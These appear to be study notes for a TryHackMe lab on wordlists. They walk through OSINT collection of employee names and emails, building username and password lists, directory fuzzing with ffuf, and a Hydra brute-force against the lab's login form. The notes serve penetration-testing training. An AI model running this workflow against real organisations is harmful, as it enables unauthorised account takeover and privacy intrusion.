https://tryhackme.com/room/introductiontowordlists

### Table of contents
- [[#Intro]]
- [[#Gather info for custom wordlist]]
- [[#Merging & Cleaning Wordlists]]
- [[#Using Wordlists]]

___
### Intro
[[#Table of contents|Back to the top]]

| Tool                   | Purpose                             | How it uses wordlists                                                                    |
| ---------------------- | ----------------------------------- | ---------------------------------------------------------------------------------------- |
| John the Ripper        | Password cracking                   | Dictionary attacks on password hashes                                                    |
| hashcat                | Password cracking                   | Wordlists and rule-based mutations to crack password hashes                              |
| Hydra                  | Network service login brute-forcing | Username:password wordlists into login prompts across many protocols                     |
| Gobuster / ffuf        | Directory and subdomain enumeration | Wordlists of directory names or sub-domains, sends requests to discover hidden resources |
| Burp Suite / OWASP ZAP | Web fuzzing                         | Fuzz parameters, cookies, headers for vulnerability discovery                            |
| Aircrack-ng            | Wireless password cracking          | Guess WPA/WPA2 passphrases                                                               |
- **Premade** wordlists: SecLists (`rockyou.txt`, `common.txt`)
- **Custom:** personal info, local language, industry-specific terms, cultural references, ...
- **Automated wordlist generators:** **`crunch`** generate wordlist based on known password pattern

___
### Gather info for custom wordlist
[[#Table of contents|Back to the top]]

- **Company**-specific keywords: products, features, projects code names
- **Technology**-specific keywords: frameworks, languages
- **Generic** keywords: "api", "assets", "admin", "dev", "login", "settings", ...

##### OSINT Sources
- **Professional networks:** employee names, job titles, technologies from LinkedInd, company pages, recruitment sites --> naming patterns
  [linkedin2username](https://github.com/initstring/linkedin2username) / [CrossLinked](https://github.com/m8sec/crosslinked): automate employee enumeration
- **Company websites & social media:** projects/products names, office locations, slogans, hashtags, internal acronyms, services used
- **Job advertisements** (LinkedIn, Indeed): technologies ("AWS", "Salesforce", "React" --> internal sub-domains/directories)

#### Recon
- **WHOIS** lookup: domain registration details, nameservers, IT staff contact info
- **Subdomain enumeration, certificate search:** theHarvester, Sublist3r, Recon-ng --> extract subdomains, email addresses
- **Site crawling:** words used in pages, meta-tags --> automated tool: CeWL
- **Technology fingerprinting:** BuiltWith, Wappalyzer, HTTP headers --> once identified technology --> SecLists for tailored list

##### Gathering

Setup: `echo '10.129.162.180 tryfinanceme.local social.tryfinanceme.local' >> /etc/hosts`

- **[CeWL](https://github.com/digininja/CeWL):** spiders URL, extracts unique words
```Shell
cewl -d 2 -m 3 --lowercase --with-numbers -e --email_file emails.txt -w cewl_words.txt http://tryfinanceme.local
```
- `-d 2`: spider 2 levels deep
- `-m 3`: words with $\geq$ 3 characters
- `--lowercase`: convert to lowercase
- `--with-numbers`: include words with numbers
- `-e`: email extraction
- `--email_file emails.txt`: emails output file **`emails.txt`**
- `-w cewl_words.txt`: extracted words output file **`cewl_words.txt`**
- `http://tryfinanceme.local`: target

- **Documents:** look for documents, download, extract
```Shell
wget -r -A pdf http://tryfinanceme.local/docs/
```
*recursively downloads all pdf documents from specified directory*

```Shell
for f in $(find tryfinanceme.local/docs -name '*.pdf'); do strings -n 5 "$f" | grep -vP '^[/<>%0-9\\]|^(stream|endstream|endobj|xref|trailer|startxref)$' >> raw_words.txt; done
```
*extract words from pdf*

- **Emails extraction**
```Shell
grep -RhiaoP '[A-Za-z0-9._%+-]+@tryfinanceme\.com' tryfinanceme.local/docs > emails_docs.txt
```
*finds and records any string that looks like a corporate email address (`username@tryfinanceme.com`)*

```Shell
sort -u emails_docs.txt > emails_docs.unique.txt
```
*delete duplicates*

```Shell
grep -Po '^[^@]+' emails_docs.unique.txt > users_from_emails.txt
```
*removes domain portion (`@tryfinanceme.com`)*

- **Social Pages -- Names**
e.g. : on `social.tryfinanceme.local`, each profile has `<h3 class="profile-name">Alex Johnson</h3>`
--> grab name
```Shell
curl -s http://social.tryfinanceme.local/ | grep -Po '(?<=<h3 class="profile-name">)[^<]+' > names.txt
```

- Convert into list of **likely usernames**
```Shell
awk '{print tolower($1)"."tolower($2)}' names.txt > users_first.last.txt
awk '{print tolower(substr($1,1,1))tolower($2)}' names.txt > users_flast.txt
awk '{print tolower($1)tolower(substr($2,1,1))}' names.txt > users_firstl.txt
```

___
### Merging & Cleaning Wordlists
[[#Table of contents|Back to the top]]

##### Wordlists

```Shell
cat cewl_words.txt raw_words.txt | sort -u > words_raw.txt 
```
*combine and clean lists*

```Shell
cat words_raw.txt | tr '[:upper:]' '[:lower:]' | tr -d '\r' | grep -P '^[a-z0-9][a-z0-9._-]{4,}$' | sort -u > words_clean.txt
```
- `tr '[:upper:]' '[:lower:]'`: convert upper to lower
- `tr -d '\r'`: strip windows carriage returns
- `grep -P '^[a-z0-9][a-z0-9._-]{4,}$'`: start with alphanumeric, then letters, digits, dots, underscores and dashes, at least 5 long

##### Usernames

```Shell
cat users_first.last.txt users_flast.txt users_firstl.txt users_from_emails.txt | sort -u > users.txt
```

##### Pattern-based Password List

```Shell
crunch 11 11 -t Helios20%%! -o pass_helios.txt
```
- `11 11`: minimum & maximum 11 characters
- `-t`: pattern with `%` replaced by digits

Automated tool to generate wordlist from personal info
```Shell
git clone https://github.com/Mebus/cupp.git
```

___
### Using Wordlists
[[#Table of contents|Back to the top]]

**Find directories**
```Shell
ffuf -w words_clean.txt -u http://tryfinanceme.local/FUZZ -e .php,.html,/ -mc 200,301,302
```

**Login**
```Shell
hydra -L users.txt -P pass_helios.txt -f -V -t 4 tryfinanceme.local http-post-form '/helios/login.php:username=^USER^&password=^PASS^:S=THM{'
```
`S=THM{`: success condition